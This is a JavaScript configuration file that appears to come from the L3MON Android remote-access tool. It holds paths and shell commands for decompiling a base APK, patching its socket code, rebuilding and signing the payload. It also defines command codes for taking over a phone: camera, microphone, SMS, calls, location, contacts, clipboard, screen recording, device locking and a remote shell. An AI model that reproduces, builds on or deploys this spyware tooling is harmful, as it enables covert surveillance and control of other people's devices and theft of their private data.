const path = require('path');

exports.debug = false;

exports.web_port = 22533;
exports.control_port = 22222;

// Paths

exports.termux = '/data/data/com.termux/files/home'
exports.apkBasePath = path.join(__dirname, '../assets/webpublic/base.apk')
exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/L3MON.apk')

exports.termuxApkBuildPath = exports.termux + '/assets/webpublic/build.apk'
exports.termuxApkSignedBuildPath = exports.termux + '/assets/webpublic/L3MON.apk'
exports.downloadsFolder = '/client_downloads'
exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder)
exports.projectFullPath = path.join(__dirname, '../')

exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
exports.apkSign = path.join(__dirname, '../app/factory/', 'sign.jar');
exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/l3mon/IOSocket.smali');

exports.termuxBuildCommand = 'apkmod' + ' -r "' + exports.smaliPath + '" -o "' + exports.termuxApkBuildPath + '"';
exports.termuxSignCommand = 'apkmod -s "' + exports.termuxApkBuildPath + '"' + ' -o ' + '"' + exports.termuxApkSignedBuildPath + '"' ;
exports.decompiledCommand = 'java -jar "' + exports.apkTool + '" d "' + exports.apkBasePath + '" -f -s -o "' + exports.smaliPath + '"';
exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
exports.signCommand = 'java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '"'; // <-- fix output

exports.messageKeys = {
    camera: '0xCA',
    files: '0xFI',
    call: '0xCL',
    sms: '0xSM',
    mic: '0xMI',
    location: '0xLO',
    contacts: '0xCO',
    wifi: '0xWI',
    notification: '0xNO',
    clipboard: '0xCB',
    installed: '0xIN',
    permissions: '0xPM',
    gotPermission: '0xGP',
    lockDevice: '0xLD',
    screenShot: '0xSS',
    screenRecord: '0xSR',
    rearCam: '0xRC',
    frontCam: '0xFC',
    rearPhoto: '0xRP',
    frontPhoto: '0xFP',
    shell: 'shell'
}

exports.logTypes = {
    error: {
        name: 'ERROR',
        color: 'red'
    },
    alert: {
        name: 'ALERT',
        color: 'amber'
    },
    success: {
        name: 'SUCCESS',
        color: 'limegreen'
    },
    info: {
        name: 'INFO',
        color: 'blue'
    }
}